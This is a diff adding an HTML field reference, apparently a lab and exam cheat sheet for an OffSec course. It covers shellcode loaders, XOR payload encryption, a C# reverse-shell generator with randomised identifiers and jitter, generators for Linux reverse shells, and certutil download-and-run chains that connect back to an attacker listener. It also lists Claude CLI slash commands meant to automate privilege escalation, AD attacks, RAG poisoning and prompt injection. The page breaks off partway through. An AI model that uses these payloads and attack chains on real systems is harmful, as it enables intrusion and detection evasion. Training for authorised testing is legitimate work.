@@ -1,0 +1,710 @@
+<title>OSAI Field Reference</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Syne:wght@600;700;800&family=IBM+Plex+Sans:ital,wght@0,400;0,500;0,600;1,400&family=JetBrains+Mono:wght@400;500&display=swap">
+
+<style>
+:root {
+  --bg:    #0C0E16;
+  --surf:  #141722;
+  --surf2: #1A1E30;
+  --bdr:   #252A44;
+  --text:  #D4D9EC;
+  --muted: #636A90;
+  --acc:   #EFA020;
+  --cbg:   #08090F;
+  --ok:    #52B468;
+  --err:   #D85252;
+}
+@media (prefers-color-scheme: light) {
+  :root:not([data-theme="dark"]) {
+    --bg:    #ECEFF8; --surf:  #FFFFFF; --surf2: #E2E6F4;
+    --bdr:   #BCC2DC; --text:  #141722; --muted: #4E5578;
+    --acc:   #B07800; --ok:    #27753E; --err:   #AC2A2A;
+  }
+}
+:root[data-theme="light"] {
+  --bg:    #ECEFF8; --surf:  #FFFFFF; --surf2: #E2E6F4;
+  --bdr:   #BCC2DC; --text:  #141722; --muted: #4E5578;
+  --acc:   #B07800; --ok:    #27753E; --err:   #AC2A2A;
+}
+:root[data-theme="dark"] {
+  --bg:    #0C0E16; --surf:  #141722; --surf2: #1A1E30;
+  --bdr:   #252A44; --text:  #D4D9EC; --muted: #636A90;
+  --acc:   #EFA020; --ok:    #52B468; --err:   #D85252;
+}
+
+*,*::before,*::after { box-sizing:border-box; margin:0; padding:0; }
+body { font-family:'IBM Plex Sans',system-ui,sans-serif; font-size:15px; line-height:1.65; color:var(--text); background:var(--bg); }
+
+nav { position:sticky; top:0; z-index:50; background:var(--surf); border-bottom:1px solid var(--bdr); height:50px; display:flex; align-items:center; padding:0 2rem; gap:2rem; }
+.brand { font-family:'JetBrains Mono',monospace; font-size:0.78rem; letter-spacing:0.03em; color:var(--acc); white-space:nowrap; flex-shrink:0; }
+.navlinks { display:flex; gap:1.5rem; list-style:none; flex-wrap:wrap; }
+.navlinks a { font-size:0.72rem; font-weight:600; letter-spacing:0.09em; text-transform:uppercase; color:var(--muted); text-decoration:none; transition:color 0.15s; }
+.navlinks a:hover { color:var(--acc); }
+
+.wrap { max-width:860px; margin:0 auto; padding:3.5rem 2rem 7rem; }
+
+.pghead { margin-bottom:3.5rem; padding-bottom:2rem; border-bottom:1px solid var(--bdr); }
+.eyebrow { font-family:'JetBrains Mono',monospace; font-size:0.7rem; letter-spacing:0.15em; text-transform:uppercase; color:var(--acc); margin-bottom:0.75rem; }
+h1 { font-family:'Syne',sans-serif; font-size:2.2rem; font-weight:800; color:var(--text); text-wrap:balance; line-height:1.15; margin-bottom:0.8rem; }
+.pghead p { color:var(--muted); font-size:0.9rem; max-width:62ch; }
+
+.sec { margin-bottom:4.5rem; scroll-margin-top:66px; }
+.sechead { display:flex; align-items:center; gap:0.875rem; margin-bottom:0.5rem; }
+.sechead h2 { font-family:'Syne',sans-serif; font-size:1.4rem; font-weight:700; color:var(--text); text-wrap:balance; }
+.tag { font-family:'JetBrains Mono',monospace; font-size:0.64rem; letter-spacing:0.1em; text-transform:uppercase; color:var(--muted); border:1px solid var(--bdr); padding:2px 7px; border-radius:3px; }
+.secdesc { color:var(--muted); font-size:0.87rem; max-width:68ch; margin-bottom:1.75rem; line-height:1.6; }
+.sublabel { font-size:0.68rem; font-weight:600; letter-spacing:0.1em; text-transform:uppercase; color:var(--muted); margin-bottom:0.55rem; }
+
+/* Code — always dark */
+.cb { background:#08090F; border:1px solid #1B2040; border-radius:6px; overflow-x:auto; margin-bottom:1.25rem; }
+.cblbl { font-family:'JetBrains Mono',monospace; font-size:0.64rem; letter-spacing:0.1em; text-transform:uppercase; color:#333860; padding:0.4rem 0.875rem; border-bottom:1px solid #161A32; }
+.cb pre { font-family:'JetBrains Mono',monospace; font-size:0.79rem; line-height:1.8; padding:0.75rem 0.875rem; color:#7880A4; }
+.c  { color:#EFA020; } .f { color:#68CFC6; } .v { color:#9DD49F; } .s { color:#BD8FD4; } .cm { color:#303660; }
+
+/* Tables */
+.twrap { overflow-x:auto; border:1px solid var(--bdr); border-radius:6px; margin-bottom:1.75rem; }
+table { width:100%; border-collapse:collapse; font-size:0.82rem; }
+thead th { font-family:'IBM Plex Sans',sans-serif; font-size:0.67rem; font-weight:600; letter-spacing:0.09em; text-transform:uppercase; color:var(--muted); background:var(--surf2); padding:0.55rem 1rem; text-align:left; border-bottom:1px solid var(--bdr); }
+td { padding:0.5rem 1rem; border-bottom:1px solid var(--bdr); vertical-align:top; line-height:1.5; }
+tbody tr:last-child td { border-bottom:none; }
+tbody tr:hover { background:var(--surf2); }
+.ta { font-family:'JetBrains Mono',monospace; font-size:0.75rem; color:#68CFC6; white-space:nowrap; }
+.td { font-family:'JetBrains Mono',monospace; font-size:0.75rem; color:var(--muted); white-space:nowrap; }
+.tc { color:var(--muted); font-size:0.82rem; }
+
+/* Workflow */
+.flow { display:flex; flex-direction:column; gap:0.5rem; margin-bottom:1.5rem; }
+.fstep { display:grid; grid-template-columns:26px 1fr; gap:0.875rem; align-items:start; }
+.fnum { width:26px; height:26px; border-radius:50%; background:var(--surf2); border:1px solid var(--bdr); color:var(--acc); font-family:'JetBrains Mono',monospace; font-size:0.68rem; display:flex; align-items:center; justify-content:center; flex-shrink:0; margin-top:3px; }
+.fbody h4 { font-size:0.87rem; font-weight:600; font-family:'IBM Plex Sans',sans-serif; color:var(--text); margin-bottom:0.3rem; }
+
+.note { border-left:2px solid var(--acc); background:var(--surf); padding:0.7rem 1rem; border-radius:0 4px 4px 0; margin-bottom:1.25rem; }
+.note p { font-size:0.82rem; color:var(--muted); max-width:none; }
+.note strong { color:var(--acc); }
+
+hr { border:none; border-top:1px solid var(--bdr); margin:2.5rem 0; }
+
+/* Arsenal */
+.cards { display:grid; grid-template-columns:repeat(auto-fill,minmax(248px,1fr)); gap:1rem; margin-bottom:2rem; }
+.card { background:var(--surf); border:1px solid var(--bdr); border-radius:6px; padding:1rem 1.125rem; }
+.ctop { display:flex; align-items:center; gap:0.6rem; margin-bottom:0.7rem; }
+.ico { width:26px; height:26px; border-radius:4px; display:flex; align-items:center; justify-content:center; font-size:0.85rem; flex-shrink:0; }
+.ig { background:#122A1C; color:#52B468; } .ia { background:#271C06; color:#EFA020; }
+.it { background:#0A2222; color:#68CFC6; } .ir { background:#281010; color:#D85252; }
+.ip { background:#1A0E2E; color:#BD8FD4; } .ib { background:#0A1624; color:#7ECDE8; }
+.card h3 { font-size:0.82rem; font-weight:600; font-family:'IBM Plex Sans',sans-serif; color:var(--text); }
+.card ul { list-style:none; display:flex; flex-direction:column; gap:0.275rem; }
+.card li { font-size:0.77rem; color:var(--muted); display:flex; align-items:baseline; gap:0.45rem; line-height:1.4; }
+.card li::before { content:'›'; color:var(--bdr); flex-shrink:0; }
+.card li code { font-family:'JetBrains Mono',monospace; font-size:0.72rem; color:#68CFC6; background:#08090F; padding:1px 4px; border-radius:3px; }
+
+.slist { display:flex; flex-direction:column; gap:0.5rem; margin-bottom:2.5rem; }
+.sitem { display:flex; align-items:center; gap:1rem; padding:0.6rem 0.875rem; background:var(--surf); border:1px solid var(--bdr); border-radius:5px; }
+.sitem .tname { font-family:'JetBrains Mono',monospace; font-size:0.76rem; color:var(--text); min-width:185px; flex-shrink:0; }
+.sitem .tdesc { color:var(--muted); flex:1; font-size:0.79rem; line-height:1.4; }
+.bdg { font-family:'JetBrains Mono',monospace; font-size:0.63rem; letter-spacing:0.06em; text-transform:uppercase; padding:2px 6px; border-radius:3px; white-space:nowrap; flex-shrink:0; }
+.done { background:#122A1C; color:#52B468; border:1px solid #1E4830; }
+.nice { background:#271C06; color:#EFA020; border:1px solid #442E08; }
+
+@media(max-width:600px){
+  .wrap{padding:2rem 1.25rem 4rem} h1{font-size:1.7rem}
+  nav{padding:0 1.25rem;gap:1rem} .brand{display:none} .navlinks{gap:1.25rem}
+  .cards{grid-template-columns:1fr} .sitem{flex-wrap:wrap;gap:0.4rem} .sitem .tname{min-width:auto}
+}
+</style>
+
+<nav>
+  <span class="brand">osai / field-ref</span>
+  <ul class="navlinks">
+    <li><a href="#loader">loader.py</a></li>
+    <li><a href="#linloader">linux_loader</a></li>
+    <li><a href="#xor">xor_encrypt</a></li>
+    <li><a href="#gen">gen.sh</a></li>
+    <li><a href="#linshell">linux shells</a></li>
+    <li><a href="#skills">CLI skills</a></li>
+    <li><a href="#arsenal">Arsenal</a></li>
+  </ul>
+</nav>
+
+<div class="wrap">
+
+  <header class="pghead">
+    <div class="eyebrow">OffSec OSAI · Lab Reference</div>
+    <h1>Field Reference</h1>
+    <p>Usage instructions for all custom tools — Windows and Linux loaders, XOR encryption, shell generators — plus Claude CLI skills and exam arsenal.</p>
+  </header>
+
+  <!-- ══════════════════════════════ LOADER.PY -->
+  <section class="sec" id="loader">
+    <div class="sechead">
+      <h2>loader.py</h2>
+      <span class="tag">Windows · Python 3.8+</span>
+    </div>
+    <p class="secdesc">
+      Shellcode loader with W^X memory protection, optional XOR decryption, SHA256 integrity check,
+      configurable thread timeout, and VirtualFree cleanup. Never allocates RWX — always RW → copy → RX.
+    </p>
+
+    <p class="sublabel">Quick start</p>
+    <div class="flow">
+      <div class="fstep">
+        <div class="fnum">1</div>
+        <div class="fbody">
+          <h4>Generate shellcode with msfvenom</h4>
+          <div class="cb"><div class="cblbl">kali</div>
+<pre><span class="c">msfvenom</span> <span class="f">-p</span> <span class="v">windows/x64/shell_reverse_tcp</span> <span class="f">LHOST=</span><span class="v">tun0</span> <span class="f">LPORT=</span><span class="v">4444</span> <span class="f">-f</span> <span class="v">raw</span> <span class="f">-o</span> <span class="s">shellcode.bin</span>
+<span class="cm"># -f raw  →  headerless bytes, ready for loader.py</span></pre></div>
+        </div>
+      </div>
+      <div class="fstep">
+        <div class="fnum">2</div>
+        <div class="fbody">
+          <h4>[Optional] Encrypt with xor_encrypt_bin.py</h4>
+          <div class="cb"><div class="cblbl">kali</div>
+<pre><span class="c">python3</span> xor_encrypt_bin.py shellcode.bin <span class="f">--key</span> <span class="v">0xDEADBEEF</span>
+<span class="cm"># Prints SHA256 (plaintext) and ready-to-run loader.py command</span></pre></div>
+        </div>
+      </div>
+      <div class="fstep">
+        <div class="fnum">3</div>
+        <div class="fbody">
+          <h4>Start listener, transfer, run</h4>
+          <div class="cb"><div class="cblbl">kali — listener</div>
+<pre><span class="c">rlwrap nc</span> <span class="f">-lvnp</span> <span class="v">4444</span></pre></div>
+          <div class="cb"><div class="cblbl">windows target</div>
+<pre><span class="cm"># Plaintext, default 30 s timeout</span>
+<span class="c">python</span> loader.py <span class="s">shellcode.bin</span>
+
+<span class="cm"># Encrypted + integrity check + verbose</span>
+<span class="c">python</span> loader.py <span class="s">shellcode.enc</span> <span class="f">--key</span> <span class="v">0xDEADBEEF</span> <span class="f">--checksum</span> <span class="v">&lt;sha256hex&gt;</span> <span class="f">--verbose</span>
+
+<span class="cm"># Longer timeout for staged payloads</span>
+<span class="c">python</span> loader.py <span class="s">shellcode.bin</span> <span class="f">--timeout</span> <span class="v">120</span>
+
+<span class="cm"># Fire and forget</span>
+<span class="c">python</span> loader.py <span class="s">shellcode.bin</span> <span class="f">--timeout</span> <span class="v">0</span></pre></div>
+          <div class="note"><p><strong>Order matters:</strong> loader.py decrypts first, then verifies checksum. Always pass the SHA256 of the <em>plaintext</em> to <code>--checksum</code>. xor_encrypt_bin.py prints this automatically.</p></div>
+        </div>
+      </div>
+    </div>
+
+    <p class="sublabel">CLI reference</p>
+    <div class="twrap"><table>
+      <thead><tr><th>Argument</th><th>Type</th><th>Default</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td class="ta">shellcode_file</td><td class="td">path</td><td class="td">—</td><td class="tc">Raw or XOR-encrypted .bin file</td></tr>
+        <tr><td class="ta">--key HEX</td><td class="td">hex string</td><td class="td">none</td><td class="tc">XOR key (0xDEADBEEF, DEADBEEF, 0xAB). Cyclic. Omit for plaintext.</td></tr>
+        <tr><td class="ta">--checksum SHA256</td><td class="td">hex string</td><td class="td">none</td><td class="tc">SHA256 of the <em>decrypted</em> shellcode. Aborts on mismatch before allocation.</td></tr>
+        <tr><td class="ta">--timeout N</td><td class="td">int (s)</td><td class="td">30</td><td class="tc">Max seconds to wait for shellcode thread. 0 = INFINITE.</td></tr>
+        <tr><td class="ta">--verbose</td><td class="td">flag</td><td class="td">off</td><td class="tc">DEBUG output — addresses, thread IDs, protection changes.</td></tr>
+      </tbody>
+    </table></div>
+
+    <p class="sublabel">Memory lifecycle</p>
+    <div class="cb"><div class="cblbl">execution order</div>
+<pre><span class="f">VirtualAlloc</span>        <span class="v">PAGE_READWRITE</span>      <span class="cm">← writable, not executable</span>
+<span class="f">RtlMoveMemory</span>       copy shellcode       <span class="cm">← write while RW</span>
+<span class="f">VirtualProtect</span>      <span class="v">PAGE_EXECUTE_READ</span>   <span class="cm">← write bit removed before first instruction</span>
+<span class="f">CreateThread</span>        addr → shellcode
+<span class="f">WaitForSingleObject</span> timeout_ms
+<span class="cm">──── finally block always runs ────</span>
+<span class="f">VirtualFree</span>         <span class="v">MEM_RELEASE</span>         <span class="cm">← released even on error / timeout</span></pre></div>
+  </section>
+
+  <!-- ══════════════════════════════ LINUX_LOADER -->
+  <section class="sec" id="linloader">
+    <div class="sechead">
+      <h2>linux_loader.py</h2>
+      <span class="tag">Linux · Python 3.8+</span>
+    </div>
+    <p class="secdesc">
+      Linux equivalent of loader.py. Uses mmap/mprotect/munmap (libc via ctypes) instead of Win32 API.
+      Same W^X enforcement, same CLI, same --key / --checksum format. Timeout via SIGALRM instead of thread wait.
+    </p>
+
+    <p class="sublabel">Quick start</p>
+    <div class="cb"><div class="cblbl">kali → linux target</div>
+<pre><span class="cm"># 1. Generate Linux shellcode</span>
+<span class="c">msfvenom</span> <span class="f">-p</span> <span class="v">linux/x64/shell_reverse_tcp</span> <span class="f">LHOST=</span><span class="v">tun0</span> <span class="f">LPORT=</span><span class="v">4444</span> <span class="f">-f</span> <span class="v">raw</span> <span class="f">-o</span> <span class="s">shellcode.bin</span>
+
+<span class="cm"># 2. [Optional] Encrypt</span>
+<span class="c">python3</span> xor_encrypt_bin.py shellcode.bin <span class="f">--key</span> <span class="v">0xDEADBEEF</span>
+
+<span class="cm"># 3. Listener</span>
+<span class="c">rlwrap nc</span> <span class="f">-lvnp</span> <span class="v">4444</span>
+
+<span class="cm"># 4. Linux target</span>
+<span class="c">python3</span> linux_loader.py <span class="s">shellcode.bin</span>
+<span class="c">python3</span> linux_loader.py <span class="s">shellcode.enc</span> <span class="f">--key</span> <span class="v">0xDEADBEEF</span> <span class="f">--checksum</span> <span class="v">&lt;sha256&gt;</span> <span class="f">--verbose</span>
+<span class="c">python3</span> linux_loader.py <span class="s">shellcode.bin</span> <span class="f">--timeout</span> <span class="v">0</span>   <span class="cm"># no timeout</span></pre></div>
+
+    <p class="sublabel">Memory lifecycle</p>
+    <div class="cb"><div class="cblbl">execution order</div>
+<pre><span class="f">mmap</span>        <span class="v">PROT_READ|PROT_WRITE</span>      <span class="cm">← writable, not executable</span>
+<span class="f">memcpy</span>      copy shellcode             <span class="cm">← write while RW</span>
+<span class="f">mprotect</span>    <span class="v">PROT_READ|PROT_EXEC</span>       <span class="cm">← write bit removed</span>
+<span class="f">CFUNCTYPE</span>   call shellcode as function
+<span class="f">SIGALRM</span>     timeout guard
+<span class="cm">──── finally ────</span>
+<span class="f">munmap</span>      release region             <span class="cm">← always released</span></pre></div>
+
+    <p class="sublabel">API mapping: Windows vs Linux</p>
+    <div class="twrap"><table>
+      <thead><tr><th>Operation</th><th>loader.py (Win)</th><th>linux_loader.py</th></tr></thead>
+      <tbody>
+        <tr><td class="tc">Allocate</td><td class="ta">VirtualAlloc</td><td class="ta">mmap (MAP_ANON)</td></tr>
+        <tr><td class="tc">Copy</td><td class="ta">RtlMoveMemory</td><td class="ta">memcpy</td></tr>
+        <tr><td class="tc">W^X flip</td><td class="ta">VirtualProtect</td><td class="ta">mprotect</td></tr>
+        <tr><td class="tc">Execute</td><td class="ta">CreateThread</td><td class="ta">CFUNCTYPE call</td></tr>
+        <tr><td class="tc">Timeout</td><td class="ta">WaitForSingleObject</td><td class="ta">SIGALRM</td></tr>
+        <tr><td class="tc">Cleanup</td><td class="ta">VirtualFree</td><td class="ta">munmap</td></tr>
+        <tr><td class="tc">Errors</td><td class="ta">GetLastError</td><td class="ta">errno + strerror</td></tr>
+      </tbody>
+    </table></div>
+  </section>
+
+  <!-- ══════════════════════════════ XOR_ENCRYPT_BIN -->
+  <section class="sec" id="xor">
+    <div class="sechead">
+      <h2>xor_encrypt_bin.py</h2>
+      <span class="tag">Kali · Python 3.8+</span>
+    </div>
+    <p class="secdesc">
+      Companion to loader.py. Pre-encrypts shellcode on Kali before dropping it on the target.
+      Uses the same key format as loader.py, writes a raw .enc file, and prints everything
+      you need to copy-paste — key, SHA256, and the ready-to-run loader.py command.
+    </p>
+
+    <p class="sublabel">Usage examples</p>
+    <div class="cb"><div class="cblbl">kali</div>
+<pre><span class="cm"># Random 4-byte key (default) — key printed in loader.py format</span>
+<span class="c">python3</span> xor_encrypt_bin.py shellcode.bin
+
+<span class="cm"># Fixed key, explicit output path</span>
+<span class="c">python3</span> xor_encrypt_bin.py shellcode.bin <span class="f">--key</span> <span class="v">0xDEADBEEF</span> <span class="f">-o</span> <span class="s">/tmp/drop/sc.enc</span>
+
+<span class="cm"># Random 16-byte key + round-trip verify</span>
+<span class="c">python3</span> xor_encrypt_bin.py shellcode.bin <span class="f">--key-len</span> <span class="v">16</span> <span class="f">--verify</span>
+
+<span class="cm"># Verbose: shows individual key bytes</span>
+<span class="c">python3</span> xor_encrypt_bin.py shellcode.bin <span class="f">--key</span> <span class="v">0xCAFEBABE</span> <span class="f">--verbose</span>
+
+<span class="cm"># Pipe encrypted bytes to another tool</span>
+<span class="c">python3</span> xor_encrypt_bin.py shellcode.bin <span class="f">--key</span> <span class="v">0xAB</span> <span class="f">--stdout</span> | xxd | head</pre></div>
+
+    <p class="sublabel">Example output</p>
+    <div class="cb"><div class="cblbl">stdout</div>
+<pre>[+] Input      : shellcode.bin  (510 bytes)
+[+] Output     : shellcode.enc  (510 bytes)
+[+] Key source : generated
+[+] Key (hex)  : <span class="v">0x7F2AE194</span>  (4 bytes, cyclic)
+[+] SHA256 PT  : <span class="v">a3f8c2d1...</span>
+    └─ plaintext hash  →  pass to loader.py --checksum
+[+] SHA256 CT  : <span class="v">d91b4489...</span>
+    └─ ciphertext hash →  verify transfer integrity
+
+── loader.py command (run on target) ──────────────────────
+   <span class="c">python</span> loader.py <span class="s">shellcode.enc</span> <span class="f">--key</span> <span class="v">0x7F2AE194</span> <span class="f">--checksum</span> <span class="v">a3f8c2d1...</span>
+───────────────────────────────────────────────────────────</pre></div>
+
+    <p class="sublabel">CLI reference</p>
+    <div class="twrap"><table>
+      <thead><tr><th>Argument</th><th>Type</th><th>Default</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td class="ta">input</td><td class="td">path</td><td class="td">—</td><td class="tc">Raw shellcode .bin file to encrypt</td></tr>
+        <tr><td class="ta">-o / --output PATH</td><td class="td">path</td><td class="td">&lt;input&gt;.enc</td><td class="tc">Output file path. Created directories as needed.</td></tr>
+        <tr><td class="ta">--key HEX</td><td class="td">hex string</td><td class="td">none</td><td class="tc">XOR key. Same format as loader.py. Omit to auto-generate.</td></tr>
+        <tr><td class="ta">--key-len N</td><td class="td">int</td><td class="td">4</td><td class="tc">Random key length in bytes (1–32). Ignored when --key is set.</td></tr>
+        <tr><td class="ta">--verify</td><td class="td">flag</td><td class="td">off</td><td class="tc">Decrypt output and verify it matches input. Exits 1 on mismatch.</td></tr>
+        <tr><td class="ta">--stdout</td><td class="td">flag</td><td class="td">off</td><td class="tc">Write encrypted bytes to stdout (binary) for piping.</td></tr>
+        <tr><td class="ta">--verbose</td><td class="td">flag</td><td class="td">off</td><td class="tc">DEBUG output + per-byte key breakdown.</td></tr>
+      </tbody>
+    </table></div>
+
+    <p class="sublabel">Full attack chain</p>
+    <div class="cb"><div class="cblbl">kali → target</div>
+<pre><span class="cm"># 1. Generate shellcode</span>
+<span class="c">msfvenom</span> <span class="f">-p</span> <span class="v">windows/x64/shell_reverse_tcp</span> <span class="f">LHOST=</span><span class="v">tun0</span> <span class="f">LPORT=</span><span class="v">4444</span> <span class="f">-f</span> <span class="v">raw</span> <span class="f">-o</span> <span class="s">shellcode.bin</span>
+
+<span class="cm"># 2. Encrypt — output includes loader.py command to copy</span>
+<span class="c">python3</span> xor_encrypt_bin.py shellcode.bin <span class="f">--key-len</span> <span class="v">8</span> <span class="f">--verify</span>
+
+<span class="cm"># 3. Serve</span>
+<span class="c">python3</span> <span class="f">-m</span> http.server <span class="v">8080</span>
+
+<span class="cm"># 4. Listener</span>
+<span class="c">rlwrap nc</span> <span class="f">-lvnp</span> <span class="v">4444</span>
+
+<span class="cm"># 5. Target — command from xor_encrypt_bin.py output</span>
+<span class="c">certutil</span> <span class="f">-urlcache -split -f</span> <span class="s">http://&lt;LHOST&gt;:8080/shellcode.enc</span> shellcode.enc
+<span class="c">python</span> loader.py shellcode.enc <span class="f">--key</span> <span class="v">0x&lt;KEY&gt;</span> <span class="f">--checksum</span> <span class="v">&lt;sha256&gt;</span></pre></div>
+  </section>
+
+  <!-- ══════════════════════════════ GEN.SH -->
+  <section class="sec" id="gen">
+    <div class="sechead">
+      <h2>cs_revshell / gen.sh</h2>
+      <span class="tag">Kali · Bash</span>
+    </div>
+    <p class="secdesc">
+      Generates a C# reverse shell with a 4-byte cyclic XOR key, fully randomised identifiers per run,
+      reconnect loop with jitter and back-off, and UTF-8 I/O. Outputs shell.cs ready to compile.
+    </p>
+
+    <p class="sublabel">Quick start</p>
+    <div class="flow">
+      <div class="fstep">
+        <div class="fnum">1</div>
+        <div class="fbody">
+          <h4>Make executable (once) + start listener</h4>
+          <div class="cb"><div class="cblbl">kali</div>
+<pre><span class="c">chmod</span> +x cs_revshell/gen.sh
+<span class="c">rlwrap nc</span> <span class="f">-lvnp</span> <span class="v">5986</span>   <span class="cm"># port 5986 = WinRM, blends in</span></pre></div>
+        </div>
+      </div>
+      <div class="fstep">
+        <div class="fnum">2</div>
+        <div class="fbody">
+          <h4>Generate shell.cs</h4>
+          <div class="cb"><div class="cblbl">kali</div>
+<pre><span class="cm"># Defaults: tun0 · 5986 · ./ · 5 retries · 3000 ms jitter</span>
+<span class="c">./cs_revshell/gen.sh</span>
+
+<span class="cm"># Custom: eth0, port 443, output /tmp/drop, 10 retries, 1 s jitter</span>
+<span class="c">./cs_revshell/gen.sh</span> <span class="v">eth0</span> <span class="v">443</span> <span class="s">/tmp/drop</span> <span class="v">10</span> <span class="v">1000</span></pre></div>
+        </div>
+      </div>
+      <div class="fstep">
+        <div class="fnum">3</div>
+        <div class="fbody">
+          <h4>Transfer and compile</h4>
+          <div class="cb"><div class="cblbl">kali — compile locally (no compiler needed on target)</div>
+<pre><span class="c">mcs</span> <span class="f">-out:</span><span class="s">svc.exe</span> shell.cs
+<span class="c">python3</span> <span class="f">-m</span> http.server <span class="v">8080</span></pre></div>
+          <div class="cb"><div class="cblbl">windows target</div>
+<pre><span class="c">certutil</span> <span class="f">-urlcache -split -f</span> <span class="s">http://&lt;LHOST&gt;:8080/svc.exe</span> svc.exe
+<span class="c">.\svc.exe</span>
+
+<span class="cm"># Or compile on target if .cs was transferred</span>
+<span class="c">csc.exe</span> <span class="f">/nologo /out:</span><span class="s">svc.exe</span> shell.cs</pre></div>
+        </div>
+      </div>
+    </div>
+
+    <p class="sublabel">Arguments reference</p>
+    <div class="twrap"><table>
+      <thead><tr><th>Position</th><th>Default</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td class="ta">$1 interface</td><td class="td">tun0</td><td class="tc">Network interface to resolve LHOST from</td></tr>
+        <tr><td class="ta">$2 port</td><td class="td">5986</td><td class="tc">Listener port — validated 1–65535</td></tr>
+        <tr><td class="ta">$3 output_dir</td><td class="td">.</td><td class="tc">Directory for shell.cs (created if missing)</td></tr>
+        <tr><td class="ta">$4 max_retries</td><td class="td">5</td><td class="tc">Reconnect attempts before binary exits</td></tr>
+        <tr><td class="ta">$5 jitter_ms</td><td class="td">3000</td><td class="tc">Max random sleep (ms) before each connect attempt</td></tr>
+      </tbody>
+    </table></div>
+
+    <p class="sublabel">What changes on every run</p>
+    <div class="cb"><div class="cblbl">per-invocation randomisation</div>
+<pre><span class="cm">Run 1:</span>  namespace <span class="v">GtxRonaph.BmKyelqs</span>   class <span class="v">WqKpLfTrNxBd</span>   key <span class="v">0x7f 0x2a 0xe1 0x94</span>
+<span class="cm">Run 2:</span>  namespace <span class="v">NcHbvwOsjl.FrXamepk</span>  class <span class="v">MzRvCqYbKsLt</span>   key <span class="v">0x3b 0xd5 0x08 0xc7</span>
+<span class="cm"># All method names, variable names, and locals also randomised</span>
+<span class="cm"># Only Main stays fixed — C# compiler entry-point requirement</span></pre></div>
+  </section>
+
+  <!-- ══════════════════════════════ GEN_LINUX_SHELL -->
+  <section class="sec" id="linshell">
+    <div class="sechead">
+      <h2>gen_linux_shell.sh</h2>
+      <span class="tag">Kali → Linux target</span>
+    </div>
+    <p class="secdesc">
+      Generates 7 reverse shell payloads in one shot — bash, python, socat, netcat, perl, php, and C (ELF).
+      All pre-populated with LHOST/LPORT. Pick whichever fits the target.
+    </p>
+
+    <p class="sublabel">Usage</p>
+    <div class="cb"><div class="cblbl">kali</div>
+<pre><span class="c">chmod</span> +x gen_linux_shell.sh
+
+<span class="cm"># Defaults: tun0, port 4444, output ./shells/</span>
+<span class="c">./gen_linux_shell.sh</span>
+
+<span class="cm"># Custom: eth0, port 443, output /tmp/drop</span>
+<span class="c">./gen_linux_shell.sh</span> <span class="v">eth0</span> <span class="v">443</span> <span class="s">/tmp/drop</span></pre></div>
+
+    <p class="sublabel">Generated payloads</p>
+    <div class="twrap"><table>
+      <thead><tr><th>File</th><th>Language</th><th>Notes</th></tr></thead>
+      <tbody>
+        <tr><td class="ta">bash_shell.sh</td><td class="td">Bash</td><td class="tc">/dev/tcp one-liner — most compatible, no deps</td></tr>
+        <tr><td class="ta">python_shell.py</td><td class="td">Python 3</td><td class="tc">PTY spawn — full interactive shell</td></tr>
+        <tr><td class="ta">socat_shell.sh</td><td class="td">Bash/socat</td><td class="tc">Interactive TTY — best quality, needs socat on target</td></tr>
+        <tr><td class="ta">nc_shell.sh</td><td class="td">Bash/nc</td><td class="tc">mkfifo trick — no -e flag needed</td></tr>
+        <tr><td class="ta">perl_shell.pl</td><td class="td">Perl</td><td class="tc">Socket shell — Perl almost always installed</td></tr>
+        <tr><td class="ta">php_shell.php</td><td class="td">PHP</td><td class="tc">For web upload scenarios</td></tr>
+        <tr><td class="ta">elf_revshell.c</td><td class="td">C</td><td class="tc">Compile: <code>gcc -o revshell elf_revshell.c</code></td></tr>
+      </tbody>
+    </table></div>
+
+    <p class="sublabel">Shell upgrade (after catching any shell)</p>
+    <div class="cb"><div class="cblbl">on target</div>
+<pre><span class="c">python3</span> -c <span class="s">'import pty;pty.spawn("/bin/bash")'</span>
+<span class="cm"># Then: Ctrl+Z</span>
+<span class="c">stty</span> raw -echo; <span class="c">fg</span>
+<span class="c">export</span> TERM=xterm</pre></div>
+  </section>
+
+  <!-- ══════════════════════════════ CLAUDE CLI SKILLS -->
+  <section class="sec" id="skills">
+    <div class="sechead">
+      <h2>Claude CLI OSAI Skills</h2>
+      <span class="tag">slash commands</span>
+    </div>
+    <p class="secdesc">
+      Pre-built skills available in Claude CLI during the exam. These automate enumeration,
+      triage, attack path analysis, credential tracking, and report generation. Use them via
+      slash commands in any Claude Code session.
+    </p>
+
+    <p class="sublabel">Recon &amp; Enumeration</p>
+    <div class="slist">
+      <div class="sitem">
+        <span class="tname">/osai-parallel-recon</span>
+        <span class="tdesc">Fan out nmap/enum4linux/gobuster across hosts, triage results by severity</span>
+      </div>
+      <div class="sitem">
+        <span class="tname">/osai-triage</span>
+        <span class="tdesc">Score raw tool output by severity, extract high-value lines for context</span>
+      </div>
+      <div class="sitem">
+        <span class="tname">/osai-ai-hunter</span>
+        <span class="tdesc">Fingerprint LLM APIs, chatbots, RAG endpoints, MCP servers on target</span>
+      </div>
+    </div>
+
+    <p class="sublabel">Exploitation</p>
+    <div class="slist">
+      <div class="sitem">
+        <span class="tname">/osai-winpeas</span>
+        <span class="tdesc">Parse winPEAS/linPEAS output, extract critical privesc findings, map to exploits</span>
+      </div>
+      <div class="sitem">
+        <span class="tname">/osai-linux-attack</span>
+        <span class="tdesc">Find Linux priv esc paths, produce exact GTFObins/exploit commands</span>
+      </div>
+      <div class="sitem">
+        <span class="tname">/osai-ad-attack</span>
+        <span class="tdesc">Find AD attack paths from enum output, produce exploitation commands</span>
+      </div>
+      <div class="sitem">
+        <span class="tname">/osai-rag-attack</span>
+        <span class="tdesc">Enumerate RAG pipeline, craft poison docs, indirect prompt injection</span>
+      </div>
+    </div>
+
+    <p class="sublabel">Infrastructure &amp; State</p>
+    <div class="slist">
+      <div class="sitem">
+        <span class="tname">/osai-engage</span>
+        <span class="tdesc">Set up dirs, load scope, configure Ligolo tunnel, prep C2 listener</span>
+      </div>
+      <div class="sitem">
+        <span class="tname">/osai-pivot</span>
+        <span class="tdesc">Generate Ligolo-ng tunnel commands for new subnet, maintain tunnel map</span>
+      </div>
+      <div class="sitem">
+        <span class="tname">/osai-cred-vault</span>
+        <span class="tdesc">Log, deduplicate, and query all recovered credentials during engagement</span>
+      </div>
+    </div>
+
+    <p class="sublabel">Reporting</p>
+    <div class="slist">
+      <div class="sitem">
+        <span class="tname">/osai-notes</span>
